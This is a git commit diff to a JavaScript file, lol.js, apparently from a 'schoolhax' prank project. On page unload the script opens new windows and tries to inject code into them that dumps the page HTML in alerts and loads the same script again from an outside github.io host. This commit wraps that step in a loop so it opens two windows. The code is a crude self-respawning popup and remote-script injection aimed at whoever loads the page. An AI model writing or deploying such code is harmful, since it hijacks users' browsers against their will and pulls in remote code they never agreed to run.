14f044f5103db2c02d2dc815d8a8db690ef242fe
JeffNJellyBean <54992195+JeffNJellyBean@users.noreply.github.com>
2019-09-06 12:33:30 -0400

    Update lol.js

--- lol.js
+++ lol.js
@@ -1,21 +1,20 @@
 alert('testing');
 window.onunload = function(){
-  var theWindow = window.open('http://google.com'),
-    theDoc = theWindow.document,
-    theScript = document.createElement('script');
-  function injectThis() {
-    try {
-      alert(document.body.innerHTML);
-      var ele = document.createElement('script');
-      ele.src = "https://jeffnjellybean.github.io/schoolhax/lol.js";
-      document.body.appendChild(ele);
-      var loaded = false;
-      ele.onload = function() {loaded = true}
-      while(!loaded) {alert('Please press ok... mebbe')}
-    } catch (e) {
-      alert(e.message);
+  for (i=0;i<2;i++) {
+    var theWindow = window.open('http://google.com'),
+      theDoc = theWindow.document,
+      theScript = document.createElement('script');
+    function injectThis() {
+      try {
+        alert(document.body.innerHTML);
+        var ele = document.createElement('script');
+        ele.src = "https://jeffnjellybean.github.io/schoolhax/lol.js";
+        document.body.appendChild(ele);
+      } catch (e) {
+        alert(e.message);
+      }
     }
+    theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
+    theDoc.body.appendChild(theScript);
   }
-  theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
-  theDoc.body.appendChild(theScript);
 }
